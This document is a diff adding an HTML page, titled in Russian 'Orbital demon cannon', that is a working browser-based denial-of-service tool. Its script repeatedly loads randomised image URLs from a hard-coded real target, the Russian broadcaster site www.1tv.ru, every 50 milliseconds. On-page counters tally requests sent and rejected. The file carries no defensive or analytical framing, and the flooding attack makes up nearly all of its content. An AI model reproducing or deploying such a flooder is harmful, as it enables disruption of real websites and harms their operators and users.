@@ -1,0 +1,95 @@
+<head>
+<title>Орбитальная димонная пушка</title>
+<link href="https://fonts.googleapis.com/css?family=Exo+2" rel="stylesheet">
+<style>
+body { font-family: 'Exo 2' !important; background-color: rgb(24,24,24); }
+h1, h2, h3, h4 { color: white; font-weight: normal;}
+button{
+    border: none;
+    font-family: inherit;
+    font-size: inherit;
+    cursor: pointer;
+    padding: 25px 80px;
+    display: inline-block;
+    margin: 15px 30px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 700;
+    outline: none;
+    background: #cb4e4e;
+    color: #fff;
+    box-shadow: 0 6px #ab3c3c;
+    position: relative;
+}
+</style>
+</head>
+<body>
+<center>
+<div style="margin: 0;position: absolute;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);">
+<h1 id="target"></h1>
+<br><br>
+<button id="start">Start</button>
+<br><br>
+<h2 id="rSent">Всего запросов: 0</h2>
+<h2 id="rSucceed">Успешно: 0</h2>
+<h2 id="rFailed">Отклонены сервером: 0</h2>
+<br>
+<script type="text/javascript" src="http://widget.supercounters.com/online_t.js"></script><script type="text/javascript">sc_online_t(1389152,"Users Online","#ffffff");</script>
+</div>
+</center>
+<script>
+var isRunning  = false;
+target = 'http://www.1tv.ru/';
+startBtn = document.getElementById("start");
+targetElement = document.getElementById("target");
+rSent = document.getElementById("rSent");
+rSucceed = document.getElementById("rSucceed");
+rFailed = document.getElementById("rFailed");
+sent = 0;
+succeed = 0;
+failed = 0;
+var Interval;
+
+targetElement.innerHTML = "Текущая цель: " + target;
+
+function randomT(){
+    var text = '';
+    var p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    for(var i=0; i < 5; i++){
+        text += p.charAt(Math.floor(Math.random() * p.length));
+	}
+    return text;
+}
+
+function onAbort(){
+	failed++;
+	rFailed.innerHTML = "Отклонены сервером: " + failed;	
+}
+
+function onSucceed(){
+	succeed++;
+	rSucceed.innerHTML = "Успешно: " + succeed;	
+}
+
+function sendRequest(){
+	var img = new Image();
+	img.onerror = function() {onSucceed();};
+	img.onabort = function() {onAbort();};
+	img.setAttribute("src", target + "?" + randomT() + "=" + Math.floor(Math.random()*2147483647));
+	sent++;
+	rSent.innerHTML = "Всего запросов: " + sent;
+}
+
+startBtn.onclick = function(){
+	if(isRunning){
+		isRunning = false;
+		clearInterval(Interval);
+		this.innerHTML = 'Start';
+	}else{
+		isRunning = true;
+		this.innerHTML = 'Stop';
+		Interval = setInterval(sendRequest, 50);
+	}
+}
+</script>
+</body>
